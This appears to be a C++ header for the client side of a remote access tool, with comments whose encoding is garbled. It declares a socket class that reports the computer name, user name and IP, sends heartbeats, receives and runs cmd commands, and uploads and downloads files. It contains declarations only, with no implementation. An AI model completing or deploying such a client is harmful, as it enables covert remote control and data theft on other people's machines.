#pragma once

#include "pch.h"

#define _WINSOCK_DEPRECATED_NO_WARNINGS 

#include <Windows.h>
#include <WinSock2.h>

#define PacketMagic 0xdeadbeef
#define PCMSGSIZE 50
#define CMDSIZE 8192
#define FILEBUFFERLEN 2048
#define MAXFILESIZE (50*1024*1024)//50MB

struct PCMsg {
	char PCName[PCMSGSIZE];
	char UserName[PCMSGSIZE];
	char IP[PCMSGSIZE];
	UINT32 Magic;
};

struct HEARTBEAT {
	UINT32 Magic;
};

class MySocket {
private:
	// �ٽ�������
	CRITICAL_SECTION criticalSection;
	// socket
	SOCKET sock;
	// �������ݻ�����
	void* pRecv;
	// �������ݻ�����
	void* pSend;
	// �����壬��֤���ͺͽ��ղ���ͻ
	HANDLE mutex;

public:
	// ��ʼ��Socket
	bool SocketInit(CRITICAL_SECTION criticalSection);
	// ����һ��������ͬsocket��mutex���࣬��FreeCopy�ͷ�
	MySocket* New();
	// �ͷŸ��Ƶ���
	void FreeCopy();
	// �ͷ�ԭʼ����
	void Free();
	// ����
	bool Connect(const char* ip, u_short port);
	// TCHAR to char
	void TcharToChar(const TCHAR* tchar, char* _char);
	// ��ȡ�������Ϣ
	PCMsg* GetPCMsg();
	// ����PC��Ϣ
	bool SendMsg(PCMsg* msg);
	// ����������
	bool MySendHeartBeat();
	// ����ָ��
	bool RecvIns(UINT32* Command);
	// ����cmdָ��
	bool RecvCommand(wchar_t* Command, char* buf);
	// ����cmd���
	bool SendResult(wchar_t* res, char* buf);
	// �����ļ�
	bool WriteToFile(char* FileBuf, wchar_t* path);
	// �����ļ�
	bool RecvFile(char* File, int len);
	// ��ȡ�ļ�
	int ReadFromFile(wchar_t* Path, UINT32* len, char** FileBuf);
	// �����ļ�
	bool SendFile(char* File, int len);
	// ����ָ��
	bool SendCommand(UINT32 command);
};

